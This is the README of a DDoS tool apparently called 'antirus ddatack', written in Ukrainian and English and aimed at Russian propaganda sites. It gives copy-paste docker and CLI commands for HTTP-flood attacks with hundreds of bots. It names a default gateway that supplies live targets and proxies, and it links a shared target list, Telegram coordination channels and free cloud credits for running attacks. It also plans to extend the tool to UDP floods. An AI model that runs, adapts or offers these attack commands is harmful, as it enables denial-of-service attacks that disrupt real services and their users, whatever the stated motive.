# propaganda-ddos

```bash 
bash docker run -it --rm lovefromukraine/antiprop ddatack --bots 100 <TARGET_URL>
```
### Використання / Usage

```
docker run -it --rm lovefromukraine/antiprop ddatack [--api 1|2] [--bots int] \ 
  [--onlyproxy] [--file path | --src url | --gateway url | <TARGET_URL>]
  
Надсилає багато HTTP запитів на обрані цілі.
Цілі беруться із джерел: --file path | --src url | --gateway url | <TARGET_URL>.

antirus ddatack [flags]

Flags:
      --api int          версія API джерела; досутпні версії: 1, 2 (default 2)
      --gateway string   адреса, що повертає списки джерела для атаки (default "http://rockstarbloggers.ru/hosts.json")
  -h, --help             help for ddatack
      --src string       джерело. адреса з якої отримати дані про атаку

Global Flags:
      --bots int       кількість ботів (активних з'єднань) (default 200)
      --epoch int      к-сть запитів перед новою ціллю (default 10000)
      --errcount int   к-сть помилок на бота, щоб той закінчив роботу (default 100)
      --file string    файл із цілями та проксі
      --onlyproxy      з'єднання тільки через проксі
failed to resize tty, using default size

```

### Де запускати? / Where to run?
- [Guide GCP (free 300$)](https://docs.google.com/document/d/1ZREB8bejySMtdSWfHS8rDNiywsytLZhV05WyUsVhNMI/edit) 
- [Microsoft Azure (free 200$)](https://dou.ua/forums/topic/36795/?from=fptech)
- [Amazon AWS (free 200$)](https://www.youtube.com/playlist?list=PLY1sAemBLA5ztXFauZJU1b292umoWMeZ4)

# Coordination
- https://t.me/incourse911
- https://t.me/itarmyofukraine2022 (english posts are included)


### API IMPLEMENTATION: 
- https://gitlab.com/cto.endel/atack_api.git

### `ddatack` REFERENCE IMPLEMENTATIONS:
- https://gitlab.com/ELWAHAB/dd-atack (php)
- https://github.com/AlexTrushkovsky/NoWarDDoS (python)

### HOW ```antirus ddatack``` WORKS
1) Звертаєтеся до `GATEWAY` (наприклад, http://rockstarbloggers.ru/hosts.json), щоб отримати список `ДЖЕРЕЛ`.
2) Зв'язуєтеся з `ДЖЕРЕЛОМ`, щоб отримати цілі та проксі для атаки (знайдете приклади відповідей від `ДЖЕРЕЛА` в каталозі `example`).
3) Починаєте надсилати запити на адресу отриману від `ДЖЕРЕЛА`, щоб показати свою любов :blue_heart: :yellow_heart:
***
1) You contact the `GATEWAY` (e.g. http://rockstarbloggers.ru/hosts.json), to get a list of `SOURCES`.
2) Contact a `SOURCE` to get the target and proxy for attack (examples of responses are in `example/` directory).
3) Start sending requsts to the target endpoint to show your love :blue_heart: :yellow_heart: 

_TODO: Checks & verifications should be in place at every step_ 

### TARGETS DB
https://docs.google.com/spreadsheets/d/1TlWTY9jxtyyb1H3AGt4QiQo17MGEUSE4LOl7vgynwxg/edit#gid=0

## ЗБІЛДИТИ ПРОГРАМУ (TO BUILD)
```bash
git clone https://github.com/meddion/anti-rusnya-ddos.git
cd anti-rusnya-ddos

# Docker
docker build -t antirus . 
docker run -it --rm antirus help 

# Або локально (Or locally)
make build # or go build -o antirus -v .
./antirus help
```
## ДОСТУПНІ КОМАНДИ (COMMANDS)
```bash
# Щоб глянути доступні команди
docker run -it --rm antirus help 
# or
./antirus help
```
```bash
# як використовувати
./antirus help ddatack 

# HTTP flood атака від: (https://t.me/incourse911)
./antirus ddatack --api 1 --bots 500 --gateway "http://rockstarbloggers.ru/hosts.json"
./antirus ddatack --api 2 --bots 100 --onlyproxy --src <SRC_URL>
./antirus ddatack --api 2 --bots 100 --file <FILE_PATH>
```

## TODO:
- TEST, TEST, AND TEST!
- Adjust connection constants

- Push docker image to docker hub

- Make a general DDoS tool (UDP), not only HTTP flood

- Add own sources & proxies -- create gateway and target api's

- Add script to launch in GCP https://docs.google.com/document/d/1ZREB8bejySMtdSWfHS8rDNiywsytLZhV05WyUsVhNMI/edit


